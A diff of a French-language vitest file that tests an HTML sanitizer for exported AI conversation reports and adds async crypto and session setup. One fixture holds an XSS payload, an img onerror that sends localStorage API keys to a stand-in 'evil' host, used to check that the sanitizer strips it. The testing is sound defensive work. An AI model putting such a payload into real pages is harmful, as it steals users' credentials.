@@ -1,11 +1,24 @@
-import { describe, it, expect } from 'vitest'
+import { beforeAll, describe, it, expect } from 'vitest'
 import {
   buildConversationMarkdown,
   buildConversationHtml,
   sanitizeReportHtml,
 } from '../../services/conversationExport'
 import { saveReport, getReport } from '../../services/reportGenerator'
+import { initCrypto } from '../../services/crypto'
+import { setActiveSession } from '../../services/userSession'
 import type { Conversation } from '../../types'
+
+beforeAll(async () => {
+  localStorage.clear()
+  setActiveSession({
+    userId: 'report-test',
+    authMethod: 'apikey',
+    displayName: 'Report Test',
+    createdAt: 1,
+  })
+  await initCrypto('report-test-secret')
+})
 
 const fakeConv: Conversation = {
   id: 'test-id',
@@ -173,8 +186,8 @@ describe('sanitizeReportHtml — sécurité (neutralise le HTML hostile)', () =>
   })
 
   it("neutralise un onerror injecté par l'IA dans le contenu du rapport, tout en gardant le rapport", async () => {
-    const id = saveReport('Rapport', `<p>contenu sûr</p><img src=x onerror="fetch('//evil/?d='+localStorage.getItem('api-keys'))">`)
-    const clean = await sanitizeReportHtml(getReport(id)!)
+    const id = await saveReport('Rapport', `<p>contenu sûr</p><img src=x onerror="fetch('//evil/?d='+localStorage.getItem('api-keys'))">`)
+    const clean = await sanitizeReportHtml((await getReport(id))!)
     expect(clean).not.toContain('onerror')
     expect(clean).toContain('contenu sûr')
     expect(clean).toContain('<style') // le style du rapport survit
@@ -183,8 +196,8 @@ describe('sanitizeReportHtml — sécurité (neutralise le HTML hostile)', () =>
 
 describe('sanitizeReportHtml — fidélité visuelle (le rapport reste stylé)', () => {
   it("préserve le <style> du <head> et son CSS (WHOLE_DOCUMENT actif)", async () => {
-    const id = saveReport('Rapport Test', '<h1>Bonjour</h1><p>Contenu</p>')
-    const clean = await sanitizeReportHtml(getReport(id)!)
+    const id = await saveReport('Rapport Test', '<h1>Bonjour</h1><p>Contenu</p>')
+    const clean = await sanitizeReportHtml((await getReport(id))!)
     expect(clean).toContain('<style')
     // Garde-fou : si quelqu'un retire WHOLE_DOCUMENT, le <head><style> saute et
     // ces marqueurs disparaissent → le rapport sortirait sans aucun style.
